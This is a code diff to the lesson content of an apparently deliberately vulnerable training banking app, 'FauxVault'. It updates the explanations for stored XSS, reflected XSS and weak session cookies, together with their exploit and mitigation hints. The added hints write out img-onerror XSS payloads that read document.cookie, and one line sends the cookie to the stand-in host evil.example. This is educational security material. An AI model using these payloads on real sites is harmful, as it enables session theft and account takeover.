@@ -157,14 +157,14 @@ const MODULE_CONTENT = {
         owaspWeb: 'A03:2025 - Injection',
         owaspApi: '',
         description:
-            'Stored XSS occurs when user-supplied HTML is saved and later rendered without encoding. Every user who views the affected page can execute attacker-controlled browser code.',
+            'Stored XSS occurs when user-supplied HTML is saved and later rendered without output encoding. Every user who views the affected page can execute attacker-controlled browser code.',
         howItWorks:
-            'Transfer memo/reference text is stored with the transaction. When xss_stored is enabled, the History page transaction description and Transfer page recent memo render that value with dangerouslySetInnerHTML.',
+            'Transfer memo/reference text is stored with the transaction. When xss_stored is enabled, the History page transaction description and Transfer page recent memo render that value with dangerouslySetInnerHTML.  Disabling the module switches both surfaces to standard JSX interpolation, which escapes the stored string to harmless text.',
         exploitHints: [
-            'Submit a transfer with an HTML event-handler payload in the memo field.',
+            'Navigate to Transfer Funds and submit a transfer with <img src=x onerror="alert(\'XSS!\')"> as the memo. Confirm the alert fires immediately in the Recent Transfers sidebar — this is the client-side render path.',
             'Navigate to Transaction History and inspect whether the memo executes when rendered.',
             'Return to Transfer and check the recent-transfer memo rendering path too.',
-            'Try payloads that do not rely on script tags, such as <img src=x onerror=alert(1)>.',
+            'Submit a second transfer with <img src=x onerror="alert(\'Cookie: \' + document.cookie)"> as the memo, then navigate to /history. Observe what session data is exposed in the alert. Try combining with Weak Session Tokens when enabled (through a logout and login)',
         ],
         mitigationHints: [
             "Use React's default JSX rendering, it auto-escapes all output. Avoid dangerouslySetInnerHTML.",
@@ -179,20 +179,23 @@ const MODULE_CONTENT = {
         owaspWeb: 'A03:2025 - Injection',
         owaspApi: '',
         description:
-            'Reflected XSS injects a payload through a request or URL and immediately reflects it into a page without encoding. The victim must load the crafted request while authenticated for protected FauxVault pages.',
+            'Reflected XSS injects a payload through a request or URL and immediately reflects it into a page without encoding. The victim must load the crafted request while authenticated for protected FauxVault pages; if the victim has no active session, they are redirected to login and the attack fails silently.',
         howItWorks:
-            'The History page reads the ?q= URL parameter and, when xss_reflected is enabled, renders the matching-search label with dangerouslySetInnerHTML. The transfer flow also echoes an invalid toAccountId in vulnerable mode, and TransferPage renders that server error as HTML.',
+            'Two surfaces are vulnerable when this module is enabled. The History page reads the ?q= URL parameter and, when xss_reflected is enabled, renders the matching-search label with dangerouslySetInnerHTML. The transfer flow also echoes an invalid toAccountId in vulnerable mode, and TransferPage renders that server error as HTML.',
         exploitHints: [
-            'While logged in, append an HTML payload to the search URL: /history?q=<img src=x onerror=alert(1)>.',
+            'While unauthenticated: paste the payload URL while logged out. The app redirects to /login and the payload never fires. Reflected XSS requires the victim to have an active session at the moment they click the link.',
+            'While logged in, append an HTML payload to the search URL: /history?q=<img src=x onerror=alert(1)>. The search results label renders the URL parameter as live HTML and the alert fires.',
             'Use the phishing email button in the vulnerability panel to demonstrate link-based delivery.',
-            'Submit a transfer with an invalid toAccountId containing markup and observe the reflected error path.',
-            'Try URL-encoding the payload if the browser or tooling rewrites special characters.',
+            'Upgrade to cookie theft: /history?q=<img src=x onerror="alert(\'Token: \' + document.cookie)">. If Weak Session Tokens is also enabled (via logout and back in), the full JWT appears in the alert. If weak session tokens is not enabled, the reflected attack will show successful via the alert rendering, but will be mitigated by hardened cookies.',
+            'Test the server-side reflection vector: submit a transfer with <b>INVALID</b><img src=x onerror="alert(\'Server echo\')"> as the recipient ID. The server echoes the invalid value and TransferPage renders it as HTML.',
+            'Try URL-encoding the payload if the browser or tooling rewrites special characters or testing HTML injection.',
         ],
         mitigationHints: [
             'Never reflect URL parameters directly into the DOM, read them into React state and render with JSX.',
             "React's JSX rendering escapes all values by default; dangerouslySetInnerHTML bypasses this intentionally.",
             'A strict Content Security Policy (CSP) with nonce-based script allowlisting blocks most reflected XSS.',
             'Keep server validation errors generic; do not echo raw invalid values back into HTML-rendered UI.',
+            'Shorten session idle timeouts as a defense in-depth measure as reflected XSS requires the victim to click the link while their session is active. A 5-minute idle timeout reduces the window during which a phishing link can catch a live session.',
         ],
         payloadExample: '/history?q=<img src=x onerror=alert(document.cookie)>',
     },
@@ -203,12 +206,14 @@ const MODULE_CONTENT = {
         description:
             'Weak session handling exposes tokens to theft or replay. Cookies without HttpOnly can be read by JavaScript, weaker SameSite settings increase cross-site risk, and returning tokens in response bodies makes them easier to leak.',
         howItWorks:
-            'In vulnerable mode, login returns token in the JSON response and sets a cookie with HttpOnly=false, Secure=false, and SameSite=Lax. Hardened mode omits the body token and uses an HttpOnly cookie with SameSite=Strict; Secure is enabled in production.',
+            'Cookie flags are at at login time only.  Even if the application is vulnerable when toggled on, your cookies will remain protected until you log out and back in. In vulnerable mode the server returns the JWT in the response body, stores it in localStorage, and sets a cookie with HttpOnly=false, Secure=false, SameSite=None. In hardened mode the token is omitted from the response body, nothing is stored in localStorage, and the cookie uses HttpOnly=true, Secure=true (in production), SameSite=Strict. The Session Inspector on the Dashboard shows the live flag state and prompts you to re-login when needed.',
         exploitHints: [
-            'Open DevTools -> Application -> Cookies and check the token cookie flags.',
+            'Enable the module, then log out and back in.  Open DevTools -> Application -> Cookies and check the token cookie flags.',
             'Run document.cookie in the browser console, if the token appears, HttpOnly is absent.',
             'Inspect the login JSON response; in vulnerable mode it includes token, while hardened mode does not.',
+            'Enable Stored XSS alongside this module for the complete attack chain. Submit a transfer with <img src=x onerror="fetch(\'https://evil.example?c=\' + document.cookie)"> as the memo, then navigate to /history — the payload fires and silently exfiltrates the session token.',
             'Use the Session Inspector on the Dashboard to compare the live flag state after toggling the module.',
+            'Now disable this module, log out, and log back in. Run document.cookie again — it returns an empty string. The same XSS payload from the previous step fires but steals nothing.',
         ],
         mitigationHints: [
             'Set HttpOnly=true on all session cookies, JavaScript must never be able to read them.',
@@ -217,7 +222,7 @@ const MODULE_CONTENT = {
             'Use a cryptographically random JWT secret of at least 256 bits.',
             'Do not return bearer tokens in response bodies when cookie-only auth is intended.',
         ],
-        payloadExample: 'document.cookie  ->  reveals token value if HttpOnly is missing',
+        payloadExample: 'document.cookie  →  token=eyJhbG... (readable because HttpOnly is false)',
     },
 
     brute_force: {
